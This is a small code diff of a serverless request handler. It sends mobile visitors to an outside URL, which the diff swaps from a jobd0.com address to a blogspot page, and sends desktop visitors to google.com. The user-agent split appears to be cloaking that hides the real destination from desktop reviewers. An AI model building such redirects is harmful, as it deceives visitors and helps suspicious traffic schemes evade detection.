@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://bahi22.jobd0.com/?utm_source=amsh&utm_medium=amsh", 302);
+    return Response.redirect("https://waseey.blogspot.com/?utm_source=amsh&utm_medium=ansh6", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
